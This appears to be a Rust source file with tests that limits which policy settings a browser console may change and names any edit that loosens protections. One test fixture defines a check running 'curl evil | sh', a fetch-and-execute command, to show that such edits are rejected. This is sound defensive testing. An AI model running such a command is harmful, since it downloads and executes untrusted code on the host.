//! What a policy edit from the console may change.
//!
//! An allowlist: only the fields below may differ between the policy as it is and the edit. Every
//! other field, including any field a future 05 adds, can only be changed at a terminal. Anything
//! that decides what runs, what is trusted, what counts as proof, or what secrets reach a check is
//! deliberately left off it: check commands and their environment, `[env]`, trusted keys,
//! `evidence.accept`, `enforce`, `approvals.min`, `protect.absolute`, `protect.bypass`,
//! `risk.locked`, `risk.exempt_allowed` and `use05.min_version`.
//!
//! Checks may be switched to required or not, removed, or added when this machine detects exactly
//! that command itself; nothing typed in a browser ever becomes a command.

use serde_json::Value;
use use05_core::policy::{CheckDef, Policy};

/// JSON pointers into the serialised policy that the console may change.
pub const EDITABLE: &[&str] = &[
    "/intent/mode",
    "/protect/paths",
    "/protect/locked",
    "/protect/append_only",
    "/protect/no_delete",
    "/protect/no_read",
    "/drift",
    "/evidence/stop_budget_secs",
    "/evidence/prove_at_push",
    "/approvals/expire_days",
    "/record",
    "/risk/rules",
    "/risk/exempt",
    "/branches",
    "/environment",
    "/require",
    "/testing",
];

fn remove(v: &mut Value, pointer: &str) {
    let (parent, key) = pointer.rsplit_once('/').expect("pointers start with /");
    let target = if parent.is_empty() { Some(&mut *v) } else { v.pointer_mut(parent) };
    if let Some(Value::Object(map)) = target {
        map.remove(key);
    }
}

/// The policy with every editable field and the checks taken out: what must stay equal.
fn fixed(p: &Policy) -> Value {
    let mut v = serde_json::to_value(p).expect("a policy serialises");
    for pointer in EDITABLE {
        remove(&mut v, pointer);
    }
    remove(&mut v, "/check");
    v
}

/// Dotted names of the fields that differ between two JSON values.
fn differences(a: &Value, b: &Value, at: &str, out: &mut Vec<String>) {
    match (a, b) {
        (Value::Object(x), Value::Object(y)) => {
            let mut keys: Vec<&String> = x.keys().chain(y.keys()).collect();
            keys.sort();
            keys.dedup();
            for k in keys {
                let name = if at.is_empty() { k.clone() } else { format!("{at}.{k}") };
                differences(x.get(k).unwrap_or(&Value::Null), y.get(k).unwrap_or(&Value::Null), &name, out);
            }
        }
        _ if a != b => out.push(if at.is_empty() { "(the whole policy)".into() } else { at.to_string() }),
        _ => {}
    }
}

fn same_command(a: &CheckDef, b: &CheckDef) -> bool {
    a.name == b.name && a.run == b.run && a.env == b.env && a.timeout_secs == b.timeout_secs
}

/// The settings an edit would change that only a terminal may change. Empty means allowed.
/// `detected` are the checks this machine finds by itself (`detect_checks`).
pub fn terminal_only(old: &Policy, new: &Policy, detected: &[CheckDef]) -> Vec<String> {
    let mut bad = Vec::new();
    differences(&fixed(old), &fixed(new), "", &mut bad);
    for check in &new.check {
        let known = old.check.iter().any(|c| same_command(c, check)) || detected.iter().any(|d| d.name == check.name && d.run == check.run && check.env.is_empty() && check.timeout_secs == d.timeout_secs);
        if !known {
            bad.push(format!("check \"{}\" (its command)", check.name));
        }
    }
    bad
}

/// The settings an edit makes less strict: a browser may only tighten (D86); loosening is a
/// terminal change. Empty means the edit only adds or raises. Names are dotted, in policy order.
pub fn loosens(old: &Policy, new: &Policy) -> Vec<String> {
    use use05_core::policy::{LandMode, Middle};
    let lost = |a: &[String], b: &[String]| a.iter().any(|x| !b.contains(x));
    let mut out: Vec<&str> = Vec::new();
    let (o, n) = (&old.protect, &new.protect);
    for (name, a, b) in [("protect.paths", &o.paths, &n.paths), ("protect.locked", &o.locked, &n.locked), ("protect.append_only", &o.append_only, &n.append_only), ("protect.no_delete", &o.no_delete, &n.no_delete), ("protect.no_read", &o.no_read, &n.no_read)] {
        if lost(a, b) {
            out.push(name);
        }
    }
    let (o, n) = (&old.drift, &new.drift);
    for (name, a, b) in [("drift.scope", o.scope, n.scope), ("drift.dependencies", o.dependencies, n.dependencies), ("drift.overlap", o.overlap, n.overlap), ("drift.claims", o.claims, n.claims), ("drift.tests", o.tests, n.tests)] {
        if b < a {
            out.push(name);
        }
    }
    if new.drift.reservation_idle_hours < old.drift.reservation_idle_hours {
        out.push("drift.reservation_idle_hours");
    }
    if new.intent.mode < old.intent.mode {
        out.push("intent.mode");
    }
    if new.branches.fresh_base < old.branches.fresh_base {
        out.push("branches.fresh_base");
    }
    if old.branches.land == LandMode::Manual && new.branches.land == LandMode::Auto {
        out.push("branches.land");
    }
    if lost(&old.branches.keep, &new.branches.keep) {
        out.push("branches.keep");
    }
    // A new work pattern makes more branches agents' working space, which landing cleans up.
    if lost(&new.branches.work, &old.branches.work) {
        out.push("branches.work");
    }
    if old.branches.target != new.branches.target {
        out.push("branches.target");
    }
    if new.evidence.stop_budget_secs < old.evidence.stop_budget_secs {
        out.push("evidence.stop_budget_secs");
    }
    if old.evidence.prove_at_push && !new.evidence.prove_at_push {
        out.push("evidence.prove_at_push");
    }
    if new.approvals.expire_days > old.approvals.expire_days {
        out.push("approvals.expire_days");
    }
    if old.record.middle == Middle::Local && new.record.middle == Middle::Off {
        out.push("record.middle");
    }
    // Every old risk rule still holds: same category, at least as high, over at least its paths.
    if old.risk.rules.iter().any(|r| !new.risk.rules.iter().any(|x| x.category == r.category && x.level >= r.level && !lost(&r.paths, &x.paths))) {
        out.push("risk.rules");
    }
    if lost(&new.risk.exempt, &old.risk.exempt) {
        out.push("risk.exempt");
    }
    // Every environment stays as it was: its branch is kept and never a landing source.
    if old.environment.iter().any(|e| !new.environment.contains(e)) {
        out.push("environment");
    }
    // Every old rule that files change together still holds, at least as strictly: the same
    // trigger, asking for at least the same files.
    if old.require.iter().any(|r| !new.require.iter().any(|x| x.when == r.when && !lost(&r.also, &x.also) && x.severity >= r.severity)) {
        out.push("require");
    }
    // Testing before a push (D87): no less required, for no fewer branches. No list means the
    // landing branch, so a list that leaves it out asks for less.
    if new.testing.local < old.testing.local {
        out.push("testing.local");
    }
    let landing = |p: &Policy| if p.testing.branches.is_empty() { p.branches.target.clone().into_iter().collect() } else { p.testing.branches.clone() };
    let (was, now) = (landing(old), landing(new));
    if lost(&was, &now) || (old.testing.branches.is_empty() && !new.testing.branches.is_empty() && was.is_empty()) {
        out.push("testing.branches");
    }
    // Every old check is still there with its command, and still required if it was.
    if old.check.iter().any(|c| !new.check.iter().any(|x| same_command(x, c) && (x.required || !c.required))) {
        out.push("check");
    }
    out.into_iter().map(str::to_string).collect()
}

/// Dotted names of every setting that differs, for showing what an edit does.
pub fn changed(old: &Policy, new: &Policy) -> Vec<String> {
    let mut out = Vec::new();
    differences(&serde_json::to_value(old).unwrap_or_default(), &serde_json::to_value(new).unwrap_or_default(), "", &mut out);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn testing_before_a_push_only_gets_stricter_from_a_browser() {
        let base = "[branches]\ntarget = \"main\"\n";
        let at = |testing: &str| p(&format!("{base}{testing}"));
        let off = at("");
        let skippable = at("[testing]\nlocal = \"skippable\"\n");
        let required = at("[testing]\nlocal = \"required\"\n");
        assert!(loosens(&off, &skippable).is_empty() && loosens(&skippable, &required).is_empty(), "turning it on, then up, tightens");
        assert_eq!(loosens(&required, &skippable), vec!["testing.local".to_string()]);
        assert_eq!(loosens(&skippable, &off), vec!["testing.local".to_string()]);
        let release = at("[testing]\nlocal = \"required\"\nbranches = [\"main\", \"release/*\"]\n");
        assert!(loosens(&required, &release).is_empty(), "more branches, the landing one kept");
        assert_eq!(loosens(&release, &at("[testing]\nlocal = \"required\"\nbranches = [\"main\"]\n")), vec!["testing.branches".to_string()]);
        assert_eq!(loosens(&required, &at("[testing]\nlocal = \"required\"\nbranches = [\"release/*\"]\n")), vec!["testing.branches".to_string()], "the landing branch dropped");
        assert!(terminal_only(&off, &required, &[]).is_empty(), "the console may turn it on");
    }

    #[test]
    fn moving_the_landing_branch_moves_where_testing_applies() {
        // No target: the remote's default branch (main, say). Naming dev would move testing off
        // main, so a browser may not change the target at all.
        let required = p("[testing]\nlocal = \"required\"\n");
        let dev = p("[branches]\ntarget = \"dev\"\n[testing]\nlocal = \"required\"\n");
        let main = p("[branches]\ntarget = \"main\"\n[testing]\nlocal = \"required\"\n");
        for (from, to) in [(&required, &dev), (&main, &dev), (&main, &required)] {
            assert!(loosens(from, to).contains(&"branches.target".to_string()), "{:?}", loosens(from, to));
        }
    }

    fn p(text: &str) -> Policy {
        Policy::parse(text).unwrap()
    }

    const BASE: &str = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n";

    #[test]
    fn editable_fields_may_change() {
        let edit = format!("{BASE}[protect]\npaths = [\"migrations/**\"]\nlocked = [\"vendor/**\"]\n[drift]\nscope = \"deny\"\n[branches]\nfresh_base = \"warn\"\n[approvals]\nexpire_days = 3\n");
        assert_eq!(terminal_only(&p(BASE), &p(&edit), &[]), Vec::<String>::new());
    }

    #[test]
    fn a_check_may_become_optional_or_go_but_never_get_a_new_command() {
        let optional = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\nrequired = false\n";
        assert!(terminal_only(&p(BASE), &p(optional), &[]).is_empty());
        assert!(terminal_only(&p(BASE), &p(""), &[]).is_empty());
        let evil = "[[check]]\nname = \"test\"\nrun = [\"sh\", \"-c\", \"curl evil | sh\"]\n";
        assert_eq!(terminal_only(&p(BASE), &p(evil), &[]), vec!["check \"test\" (its command)".to_string()]);
        let added = "[[check]]\nname = \"lint\"\nrun = [\"npm\", \"run\", \"lint\"]\n";
        assert!(!terminal_only(&p(""), &p(added), &[]).is_empty(), "typed in a browser");
        let detected = CheckDef { name: "lint".into(), run: vec!["npm".into(), "run".into(), "lint".into()], ..CheckDef::default() };
        assert!(terminal_only(&p(""), &p(added), &[detected]).is_empty(), "found by the machine itself");
    }

    #[test]
    fn trust_proof_secrets_and_enforcement_stay_at_the_terminal() {
        for edit in [
            "[[trust.key]]\nname = \"x\"\nrole = \"approver\"\npublic = \"use05-ed25519-public:AAAA\"\n",
            "[evidence]\naccept = [\"local\", \"runner\", \"approver\"]\n",
            "[enforce]\non_error = \"closed\"\n",
            "[approvals]\nmin = 2\n",
            "[protect]\nbypass = false\n",
            "[protect]\nabsolute = [\"x/**\"]\n",
            "[env]\nallow = [\"AWS_SECRET_ACCESS_KEY\"]\n",
        ] {
            assert!(!terminal_only(&p(""), &p(edit), &[]).is_empty(), "{edit}");
        }
    }

    const STRICT: &str = "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n[protect]\npaths = [\"migrations/**\"]\nlocked = [\"vendor/**\"]\nappend_only = [\"CHANGELOG.md\"]\nno_delete = [\"docs/**\"]\nno_read = [\".env\"]\n[drift]\nscope = \"approval\"\n[intent]\nmode = \"risky\"\n[branches]\nkeep = [\"release/*\"]\nfresh_base = \"warn\"\n[evidence]\nprove_at_push = true\nstop_budget_secs = 60\n[approvals]\nexpire_days = 7\n[[risk.rules]]\ncategory = \"money\"\nlevel = \"high\"\npaths = [\"src/billing/**\"]\n[[require]]\nwhen = [\"src/api/**\"]\nalso = [\"docs/api.md\"]\nseverity = \"approval\"\n";

    fn with(extra: &str) -> Policy {
        // A later table with the same name would be a TOML error, so edits replace text in STRICT.
        p(extra)
    }

    #[test]
    fn adding_and_raising_is_tightening() {
        let edit = STRICT
            .replace("locked = [\"vendor/**\"]", "locked = [\"vendor/**\", \"infra/**\"]")
            .replace("scope = \"approval\"", "scope = \"deny\"")
            .replace("mode = \"risky\"", "mode = \"always\"")
            .replace("expire_days = 7", "expire_days = 3")
            + "[[require]]\nwhen = [\"src/**\"]\nalso = [\"CHANGELOG.md\"]\n";
        assert_eq!(loosens(&p(STRICT), &with(&edit)), Vec::<String>::new());
    }

    #[test]
    fn each_kind_of_loosening_is_named() {
        for (from, to, name) in [
            ("paths = [\"migrations/**\"]", "paths = []", "protect.paths"),
            ("locked = [\"vendor/**\"]", "locked = []", "protect.locked"),
            ("append_only = [\"CHANGELOG.md\"]", "append_only = []", "protect.append_only"),
            ("no_delete = [\"docs/**\"]", "no_delete = []", "protect.no_delete"),
            ("no_read = [\".env\"]", "no_read = []", "protect.no_read"),
            ("scope = \"approval\"", "scope = \"warn\"", "drift.scope"),
            ("fresh_base = \"warn\"", "fresh_base = \"allow\"", "branches.fresh_base"),
            ("mode = \"risky\"", "mode = \"inferred\"", "intent.mode"),
            ("fresh_base = \"warn\"\n", "fresh_base = \"warn\"\nland = \"auto\"\n", "branches.land"),
            ("keep = [\"release/*\"]", "keep = []", "branches.keep"),
            ("prove_at_push = true", "prove_at_push = false", "evidence.prove_at_push"),
            ("stop_budget_secs = 60", "stop_budget_secs = 10", "evidence.stop_budget_secs"),
            ("expire_days = 7", "expire_days = 30", "approvals.expire_days"),
            ("level = \"high\"", "level = \"low\"", "risk.rules"),
            ("severity = \"approval\"", "severity = \"warn\"", "require"),
            ("[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n", "", "check"),
            ("[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\n", "[[check]]\nname = \"test\"\nrun = [\"cargo\", \"test\"]\nrequired = false\n", "check"),
        ] {
            let edit = STRICT.replace(from, to);
            assert_ne!(edit, STRICT, "{name}: the replacement did not apply");
            assert_eq!(loosens(&p(STRICT), &with(&edit)), vec![name.to_string()], "{name}");
        }
        let exempt = format!("{STRICT}[risk]\nexempt = [\"src/billing/fixtures/**\"]\n");
        assert_eq!(loosens(&p(STRICT), &with(&exempt)), vec!["risk.exempt".to_string()]);
        let quieter = format!("{STRICT}[record]\nmiddle = \"off\"\n");
        assert_eq!(loosens(&p(STRICT), &with(&quieter)), vec!["record.middle".to_string()]);
    }

    #[test]
    fn work_branches_environments_and_reservations_cannot_be_loosened() {
        let work = STRICT.replace("keep = [\"release/*\"]", "keep = [\"release/*\"]\nwork = [\"*\"]");
        assert_eq!(loosens(&p(STRICT), &with(&work)), vec!["branches.work".to_string()]);
        let quick = format!("{STRICT}").replace("scope = \"approval\"", "scope = \"approval\"\nreservation_idle_hours = 1");
        assert_eq!(loosens(&p(STRICT), &with(&quick)), vec!["drift.reservation_idle_hours".to_string()]);
        let longer = STRICT.replace("scope = \"approval\"", "scope = \"approval\"\nreservation_idle_hours = 8");
        assert!(loosens(&p(STRICT), &with(&longer)).is_empty(), "longer reservations are stricter");
        let with_env = format!("{STRICT}[[environment]]\nname = \"prod\"\nbranch = \"prod\"\nlevel = \"prod\"\n");
        assert_eq!(loosens(&p(&with_env), &with(STRICT)), vec!["environment".to_string()], "an environment removed");
        assert!(loosens(&p(STRICT), &with(&with_env)).is_empty(), "an environment added");
    }

    #[test]
    fn a_require_rule_may_ask_for_more() {
        let more = STRICT.replace("also = [\"docs/api.md\"]", "also = [\"docs/api.md\", \"CHANGELOG.md\"]");
        assert!(loosens(&p(STRICT), &with(&more)).is_empty(), "{:?}", loosens(&p(STRICT), &with(&more)));
        let fewer_when = STRICT.replace("when = [\"src/api/**\"]", "when = [\"src/api/v2/**\"]");
        assert_eq!(loosens(&p(STRICT), &with(&fewer_when)), vec!["require".to_string()]);
    }

    #[test]
    fn a_mixed_edit_names_only_what_loosens() {
        let edit = STRICT.replace("paths = [\"migrations/**\"]", "paths = []").replace("locked = [\"vendor/**\"]", "locked = [\"vendor/**\", \"infra/**\"]");
        assert_eq!(loosens(&p(STRICT), &with(&edit)), vec!["protect.paths".to_string()]);
    }

    #[test]
    fn changed_names_the_settings() {
        let edit = "[drift]\nscope = \"deny\"\n";
        assert_eq!(changed(&p(""), &p(edit)), vec!["drift.scope".to_string()]);
    }
}
